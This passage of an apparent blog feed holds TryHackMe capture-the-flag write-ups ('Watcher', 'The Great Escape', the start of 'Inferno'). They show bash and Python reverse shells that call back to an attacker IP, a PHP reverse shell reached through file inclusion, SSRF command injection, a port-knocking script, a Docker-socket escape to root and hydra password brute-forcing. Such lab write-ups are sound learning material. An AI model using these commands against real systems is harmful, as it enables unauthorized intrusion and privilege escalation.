+&lt;p&gt;After doing that you must set netcat &lt;code&gt;nc -lvnp 4444&lt;/code&gt; for shell and we can go to file upload in &lt;code&gt;http://10.10.35.205/post.php?post=../../../../../home/ftpuser/ftp/files/php-reverse-shell.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_watcher/bg_9.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So now we have shell of webserver, then we get flag_3.txt.&lt;/p&gt;
+
+&lt;h3 id=&quot;flag-3&quot;&gt;Flag 3&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;www-data@watcher:$ cd /var/www/html/more_secrets_a9f10a
+www-data@watcher:/var/www/html/more_secrets_a9f10a$ ls
+flag_3.txt
+www-data@watcher:/var/www/html/more_secrets_a9f10a$ cat flag_3.txt
+cat flag_3.txt
+FLAG{l------------y}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then i’m check the privilage with sudo -l and here is the output:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo -l
+Matching Defaults entries for www-data on watcher:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on watcher:
+    (toby) NOPASSWD: ALL
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;That you can see, the user www can access user toby and we can change user without using password with this command &lt;code&gt;sudo -u toby bash&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_watcher/bg_10.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;flag-4&quot;&gt;Flag 4&lt;/h3&gt;
+
+&lt;p&gt;And there is also have flag_4.txt&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;toby@watcher:~$ cat flag_4.txt                                                         
+cat flag_4.txt                                                                   
+FLAG{c------------e}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After that we can echo shell to cow.sh, i know it because there is have note.txt and explain the user of mat create cronjob with permision of mat. Now we can put revershell to cow.sh &lt;code&gt;echo &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.2.47.251/1234 0&amp;gt;&amp;amp;1&quot; &amp;gt;&amp;gt; cow.sh&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Note.txt :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Hi Toby,
+
+I've got the cron jobs set up now so don't worry about getting that done.
+
+Mat
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/thm_watcher/bg_11.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;flag-5&quot;&gt;Flag 5&lt;/h3&gt;
+
+&lt;p&gt;Now we got the shell of user mat from the cronjob and also the flag_5.txt&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mat@watcher:~$ cat flag_5.txt
+cat flag_5.txt
+FLAG{li--------------------------ow}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;the user can access script python :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mat@watcher:~$ sudo -l
+sudo -l
+Matching Defaults entries for mat on watcher:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mat may run the following commands on watcher:
+    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then there is have some text is note.txt :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Hi Mat,
+
+I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.
+
+Will
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now we can change the script and doing Python Library injection with this command :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.2.47.251&quot;,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/thm_watcher/bg_12.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;flag-6&quot;&gt;Flag 6&lt;/h3&gt;
+
+&lt;p&gt;Then run this with user will without using any password. &lt;code&gt;sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_watcher/bg_13.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Boom! we got the user &lt;code&gt;will&lt;/code&gt; also the flag_6.txt ofcourse :D&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ cat flag_6.txt
+FLAG{but_i_thought_my_script_was_secure}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;privilage-escalation&quot;&gt;Privilage Escalation&lt;/h2&gt;
+
+&lt;p&gt;After looking around i found &lt;code&gt;/opt/backups/key.bs64&lt;/code&gt; and this is base64 encoded&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_watcher/bg_14.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can decode it :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_watcher/bg_15.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;last-flag&quot;&gt;Last Flag&lt;/h3&gt;
+
+&lt;p&gt;Then there is id_rsa key. we can access root now with the key we found.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_watcher/bg_16.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Boom we are root now and having a the last of flag.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@watcher:~# cat flag_7.txt 
+FLAG{wh--------------------rs}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;so that’s all the writeup that I made now we have 7 flags, including root flag.
+Take care and Happy hacking :D&lt;/p&gt;
+</description>
+        <pubDate>Sat, 20 Feb 2021 00:00:00 -0600</pubDate>
+        <link>/writeup-tryhackme-watcher/</link>
+        <guid isPermaLink="true">/writeup-tryhackme-watcher/</guid>
+        
+        <category>boot2root</category>
+        
+        <category>lfi</category>
+        
+        <category>medium-box</category>
+        
+        <category>privilage escalation</category>
+        
+        <category>web exploitation</category>
+        
+        <category>enumeration</category>
+        
+        
+        <category>Tryhackme</category>
+        
+        <category>Linux</category>
+        
+      </item>
+    
+      <item>
+        <title>Tryhackme The Great Escape</title>
+        <description>&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;This is partical room from tryhackme entitled “The Great Escape” with Medium difficulty. In this room we will learn about SSRF along with code injection, Port Knocking, Enumeration of docker and get escape from docker . Here we will exploit using SSRF then port knocking so that the docker port opens and enters docker then goes to the root of the box. Link for the room &lt;a href=&quot;https://tryhackme.com/room/thegreatescape&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;scanning&quot;&gt;Scanning&lt;/h2&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;First time we have to do is scanning the Machine :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ nmap -sC -sV -oA nmap 10.10.50.223
+
+Nmap scan report for 10.10.50.223
+Host is up (0.34s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh?
+| fingerprint-strings: 
+|   GenericLines: 
+|_    *W}$it$!Z5Qg-Xcg.1
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp open  http    nginx 1.19.6
+| http-robots.txt: 3 disallowed entries 
+|_/api/ /exif-util /*.bak.txt$
+|_http-server-header: nginx/1.19.6
+|_http-title: docker-escape-nuxt
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port22-TCP:V=7.91%I=7%D=2/16%Time=602B9D9C%P=x86_64-pc-linux-gnu%r(Gene
+SF:ricLines,14,&quot;\*W}\$it\$!Z5Qg-Xcg\.1\r\n&quot;);
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Feb 16 17:28:41 2021 -- 1 IP address (1 host up) scanned in 207.30 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As we can see there is have 2 open ports, Like ssh and webserver. Now let’s take a look the webserver :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_thegreatescape/bg_1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now i found robots.txt and contain different directory and file :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_thegreatescape/bg_2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;
+&lt;h3 id=&quot;fuzzing&quot;&gt;Fuzzing&lt;/h3&gt;
+
+&lt;p&gt;&lt;code&gt;wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.10.50.223/FUZZ.bak.txt&lt;/code&gt;
+After fuzzing i found this : &lt;code&gt;http://10.10.3.187/exif-util.bak.txt&lt;/code&gt; and which contains code like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt;&amp;lt;template&amp;gt;
+  &amp;lt;section&amp;gt;
+    &amp;lt;div class=&quot;container&quot;&amp;gt;
+      &amp;lt;h1 class=&quot;title&quot;&amp;gt;Exif Utils&amp;lt;/h1&amp;gt;
+      &amp;lt;section&amp;gt;
+        &amp;lt;form @submit.prevent=&quot;submitUrl&quot; name=&quot;submitUrl&quot;&amp;gt;
+          &amp;lt;b-field grouped label=&quot;Enter a URL to an image&quot;&amp;gt;
+            &amp;lt;b-input
+              placeholder=&quot;http://...&quot;
+              expanded
+              v-model=&quot;url&quot;
+            &amp;gt;&amp;lt;/b-input&amp;gt;
+            &amp;lt;b-button native-type=&quot;submit&quot; type=&quot;is-dark&quot;&amp;gt;
+              Submit
+            &amp;lt;/b-button&amp;gt;
+          &amp;lt;/b-field&amp;gt;
+        &amp;lt;/form&amp;gt;
+      &amp;lt;/section&amp;gt;
+      &amp;lt;section v-if=&quot;hasResponse&quot;&amp;gt;
+        &amp;lt;pre&amp;gt;
+          
+        &amp;lt;/pre&amp;gt;
+      &amp;lt;/section&amp;gt;
+    &amp;lt;/div&amp;gt;
+  &amp;lt;/section&amp;gt;
+&amp;lt;/template&amp;gt;
+
+&amp;lt;script&amp;gt;
+export default {
+  name: 'Exif Util',
+  auth: false,
+  data() {
+    return {
+      hasResponse: false,
+      response: '',
+      url: '',
+    }
+  },
+  methods: {
+    async submitUrl() {
+      this.hasResponse = false
+      console.log('Submitted URL')
+      try {
+        const response = await this.$axios.$get('http://api-dev-backup:8080/exif', {
+          params: {
+            url: this.url,
+          },
+        })
+        this.hasResponse = true
+        this.response = response
+      } catch (err) {
+        console.log(err)
+        this.$buefy.notification.open({
+          duration: 4000,
+          message: 'Something bad happened, please verify that the URL is valid',
+          type: 'is-danger',
+          position: 'is-top',
+          hasIcon: true,
+        })
+      }
+    },
+  },
+}
+&amp;lt;/script&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now let’s take a look at &lt;code&gt;exif-util/&lt;/code&gt;, then i try to upload file image and using burpsuite to capture this.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_thegreatescape/bg_3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;From the information provided by burpsuite we can see that the web app made a request to &lt;code&gt;/api/exif&lt;/code&gt; and the file name also changed&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_thegreatescape/bg_4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then i move to url and capture again with burpsuite, before capture i hosted files using python : &lt;code&gt;python3 -m http.server 8090&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_thegreatescape/bg_5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then the request has changed to GET, then i try to put &lt;code&gt;http://api-dev-backup:8080/exif?url=&lt;/code&gt; to request.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_thegreatescape/bg_6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;ssrf&quot;&gt;SSRF&lt;/h3&gt;
+
+&lt;p&gt;And as we can see there is curl, Now we can check id with command &lt;code&gt;echo;id&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_thegreatescape/bg_7.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And we get id of app, So we can use SSRF.Now after i looking around i’m found &lt;code&gt;dev-note.txt&lt;/code&gt; in here &lt;code&gt;http://10.10.50.223/api/exif?url=http://api-dev-backup:8080/exif?url=echo;cd%20/;cat%20/root/dev-note.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;An error occurred: File format could not be determined
+                Retrieved Content
+                ----------------------------------------
+                An error occurred: File format could not be determined
+               Retrieved Content
+               ----------------------------------------
+               Hey guys,
+
+Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.
+
+Anyways, the password is fluffybunnies123
+
+Cheers,
+
+Hydra
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then in directory of root i found .git, Now let’s check this
+&lt;code&gt;http://10.10.50.223/api/exif?url=http://api-dev-backup:8080/exif?url=echo;git%20--git-dir%20/root/.git%20log&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Author: Hydra &amp;lt;hydragyrum@example.com&amp;gt;
+Date:   Thu Jan 7 16:48:58 2021 +0000
+
+    fixed the dev note
+
+commit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
+Author: Hydra &amp;lt;hydragyrum@example.com&amp;gt;
+Date:   Wed Jan 6 20:51:39 2021 +0000
+
+    Removed the flag and original dev note b/c Security
+
+commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
+Author: Hydra &amp;lt;hydragyrum@example.com&amp;gt;
+Date:   Wed Jan 6 20:51:39 2021 +0000
+
+    Added the flag and dev notes
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;http://10.10.50.223/api/exif?url=http://api-dev-backup:8080/exif?url=echo;git%20--git-dir%20/root/.git%20diff%20a3d30a7d0510dc6565ff9316e3fb84434916dee8&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;diff --git a/dev-note.txt b/dev-note.txt
+deleted file mode 100644
+index 89dcd01..0000000
+--- a/dev-note.txt
++++ /dev/null
+@@ -1,9 +0,0 @@
+-Hey guys,
+-
+-I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.
+-
+-Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
+-
+-Cheers,
+-
+-Hydra
+\ No newline at end of file
+diff --git a/flag.txt b/flag.txt
+deleted file mode 100644
+index aae8129..0000000
+--- a/flag.txt
++++ /dev/null
+@@ -1,3 +0,0 @@
+-You found the root flag, or did you?
+-
+-THM{0c------------REDACTED--------76}
+\ No newline at end of file
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And we have flag for root flag. As we can see there is knocked ports. then i’m check the port of docker is off.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ nmap -p 2375 10.10.50.223 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 22:08 WIB
+Nmap scan report for 10.10.50.223
+Host is up (0.35s latency).
+
+PORT     STATE  SERVICE
+2375/tcp closed docker
+
+Nmap done: 1 IP address (1 host up) scanned in 0.86 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now let’s knocking that ports then we will be able to access the docker. I’m make little script for knocking :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#! /bin/bash
+curl $1:42 -m 1
+sleep 1
+curl $1:1337 -m 1
+sleep 1
+curl $1:10420 -m 1
+sleep 1
+curl $1:6969 -m 1
+sleep 1
+curl $1:63000 -m 1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let’s run this : &lt;code&gt;./knock 10.10.50.223&lt;/code&gt;. After run we check again the port of docker&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ nmap -p 2375 10.10.50.223
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 22:15 WIB
+Nmap scan report for 10.10.50.223
+Host is up (0.47s latency).
+
+PORT     STATE SERVICE
+2375/tcp open  docker
+
+Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;docker&quot;&gt;Docker&lt;/h2&gt;
+
+&lt;p&gt;Now port of docker is open, Now lets check this. 
+&lt;code&gt;docker -H 10.10.50.223:2375 info&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ docker -H 10.10.50.223:2375 info                                                                     130 ⨯ 1 ⚙
+Client:
+ Context:    default
+ Debug Mode: false
+ Plugins:
+  app: Docker App (Docker Inc., v0.9.1-beta3)
+  buildx: Build with BuildKit (Docker Inc., v0.5.1-docker)
+
+Server:
+ Containers: 4
+  Running: 4
+  Paused: 0
+  Stopped: 0
+ Images: 27
+ Server Version: 20.10.2
+ Storage Driver: overlay2
+  Backing Filesystem: extfs
+  Supports d_type: true
+  Native Overlay Diff: true
+ Logging Driver: json-file
+ Cgroup Driver: cgroupfs
+ Cgroup Version: 1
+ Plugins:
+  Volume: local
+  Network: bridge host ipvlan macvlan null overlay
+  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog
+ Swarm: inactive
+ Runtimes: io.containerd.runc.v2 io.containerd.runtime.v1.linux runc
+ Default Runtime: runc
+ Init Binary: docker-init
+ containerd version: 269548fa27e0089a8b8278fc4fc781d7f65a939b
+ runc version: ff819c7e9184c13b7c2607fe6c30ae19403a7aff
+ init version: de40ad0
+ Security Options:
+  apparmor
+  seccomp
+   Profile: default
+ Kernel Version: 4.15.0-130-generic
+ Operating System: Ubuntu 18.04.5 LTS
+ OSType: linux
+ Architecture: x86_64
+ CPUs: 1
+ Total Memory: 983.2MiB
+ Name: great-escape.thm
+ ID: FDCS:BLAR:AJNY:PW6Y:DVAY:R5IQ:VNLF:WRQ5:FP6Y:2IB5:U37T:3W6L
+ Docker Root Dir: /var/lib/docker
+ Debug Mode: false
+ Registry: https://index.docker.io/v1/
+ Labels:
+ Experimental: false
+ Insecure Registries:
+  127.0.0.0/8
+ Live Restore Enabled: false
+
+WARNING: API is accessible on http://0.0.0.0:2375 without encryption.
+         Access to the remote API is equivalent to root access on the host. Refer
+         to the 'Docker daemon attack surface' section in the documentation for
+         more information: https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface
+WARNING: No swap limit support
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;access-docker&quot;&gt;Access Docker&lt;/h3&gt;
+
+&lt;p&gt;Then we can access the docker. First lets check the image of docker :&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;$ docker -H 10.10.50.223:2375 images&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_thegreatescape/bg_8.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;$ docker -H 10.10.50.223:2375 ps&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_thegreatescape/bg_9.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;escape-from-docker&quot;&gt;Escape From Docker&lt;/h2&gt;
+
+&lt;p&gt;in this case im going to exploit alpine to escape the docker.&lt;a href=&quot;https://gtfobins.github.io/gtfobins/docker/#shell&quot;&gt;here&lt;/a&gt; the link i found for exploit this.
+&lt;code&gt;docker -H 10.10.50.223:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt bash&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ docker -H 10.10.50.223:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt bash                             1 ⚙
+groups: cannot find name for group ID 11
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &amp;lt;command&amp;gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+root@0f47e2d39595:/# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+root@0f47e2d39595:/# cd /root
+root@0f47e2d39595:~# ls
+flag.txt
+root@0f47e2d39595:~# cat flag.txt 
+Congrats, you found the real flag!
+
+THM{c----------REDACTED------------4}
+root@0f47e2d39595:~#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Boom we can escape the docker. Now for looking the flag of web we can access frontend in the docker.
+&lt;code&gt;$ docker -H 10.10.50.223:2375 exec -it dockerescapecompose_frontend_1 /bin/bash&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;After looking around i found this in nginx:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@docker-escape:/usr/share/nginx/html/.well-known# cat security.txt 
+
+Hey you found me!
+
+The security.txt file is made to help security researchers and ethical hackers to contact the company about security issues.
+
+See https://securitytxt.org/ for more information.
+
+Ping /api/fl46 with a HEAD request for a nifty treat.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;so We can curl head of &lt;code&gt;/api/fl46&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ curl --HEAD http://10.10.50.223/api/fl46
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.6
+Date: Fri, 19 Feb 2021 15:32:04 GMT
+Connection: keep-alive
+flag: THM{b8--------REDACTED------------d4}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We have flag of web now.&lt;/p&gt;
+
+&lt;p&gt;so that’s all the writeup that I made now we have 3 flags, including on the web, docker, and the machine from the box&lt;/p&gt;
+
+&lt;p&gt;Happy hacking :D&lt;/p&gt;
+</description>
+        <pubDate>Fri, 19 Feb 2021 00:00:00 -0600</pubDate>
+        <link>/writeup-tryhackme-The-Great-Escape/</link>
+        <guid isPermaLink="true">/writeup-tryhackme-The-Great-Escape/</guid>
+        
+        <category>boot2root</category>
+        
+        <category>medium-box</category>
+        
+        <category>privilage escalation</category>
+        
+        <category>web exploitation</category>
+        
+        <category>enumeration</category>
+        
+        <category>docker</category>
+        
+        <category>SSRF</category>
+        
+        
+        <category>Tryhackme</category>
+        
+        <category>Linux</category>
+        
+      </item>
+    
+      <item>
+        <title>Tryhackme Inferno</title>
+        <description>&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;This is partical room from Tryhackme entitled Inferno with Medium difficulty. In this room we will learn about exploit HTTP basic auth and IDE Exploit and Linux Privilage escalation . In this case we will find the vulnerability in Codiad (CVE-2017-15689) without further ado, let’s just start. link this room &lt;a href=&quot;https://tryhackme.com/room/inferno&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;$ nmap -sC -sV 10.10.51.44        
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-16 22:51 WIB
+Nmap scan report for 10.10.51.44
+Host is up (0.35s latency).
+Not shown: 978 closed ports
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp?
+22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
+|_  256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
+23/tcp   open  tcpwrapped
+25/tcp   open  tcpwrapped
+|_smtp-commands: Couldn't establish connection on port 25
+80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))                                                                                                                                       
+|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                                                                      
+|_http-title: Dante's Inferno                                                                                                                                                          
+88/tcp   open  tcpwrapped                                                                                                                                                                         
+106/tcp  open  pop3pw?                                                                                                                                                                            
+110/tcp  open  tcpwrapped                                                                                                                                                                         
+389/tcp  open  tcpwrapped                                                                                                                                                                         
+443/tcp  open  tcpwrapped                                                                                                                                                                         
+464/tcp  open  tcpwrapped                                                                                                                                                                         
+636/tcp  open  tcpwrapped
+777/tcp  open  tcpwrapped
+783/tcp  open  tcpwrapped
+808/tcp  open  ccproxy-http?
+873/tcp  open  tcpwrapped
+1001/tcp open  webpush?
+1236/tcp open  tcpwrapped
+1300/tcp open  tcpwrapped
+2000/tcp open  tcpwrapped
+5432/tcp open  tcpwrapped
+6346/tcp open  tcpwrapped
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 143.35 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Nmap outputs multiple ports, but in this case we’re only targeting ports 22 and 80, Now lets take a look port 80.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_inferno/bg_1.jpeg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I’m using go buster and i found /inferno, Now lets look at this :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_inferno/bg_2.jpeg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In this form login i want to use hydra to bruteforce password of admin, lets do this.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ hydra -l admin -P /home/razor/Documents/Wordlist/rockyou.txt 10.10.51.44 http-get /inferno/ -I -t 64
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/thm_inferno/bg_3.jpeg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We did it to get the password from the admin user, now we can login with the admin&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_inferno/bg_4.jpeg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After we login in codiad and post login we can see the page like this.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_inferno/bg_5.jpeg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;foothold&quot;&gt;Foothold&lt;/h2&gt;
+
+&lt;p&gt;after i did some research, i found CVE-2017-15689 which we can see &lt;a href=&quot;https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit&quot;&gt;here&lt;/a&gt;. Now lets exploit this :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_inferno/bg_6.jpeg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Here we just need to enter a command like this: &lt;code&gt;$ sudo python exploit.py http://admin:dante1@10.10.51.44/inferno/ admin dante1 10.2.47.251 1234 linux&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Seccond Term : &lt;code&gt;$ echo 'bash -c &quot;bash -i &amp;gt;/dev/tcp/10.2.47.251/1235 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&quot;' | nc -lnvp 1234 &lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Third Term : &lt;code&gt;$ nc -lnvp 1235&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;but here there is a problem where bash will exit after a few seconds, so here I use /bin/sh to get a stable shell. After looking around i found .download.dat in home directory dante : &lt;code&gt;/home/dante/Downloads/.download.dat&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_inferno/bg_7.jpeg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And there is HEX code, We can Decode to ASCII with xxd : &lt;code&gt;$ cat hexcred|xxd -r -p&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_inferno/bg_8.jpeg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we found credential for dante, Then we can login with ssh to user dante :&lt;/p&gt;
+
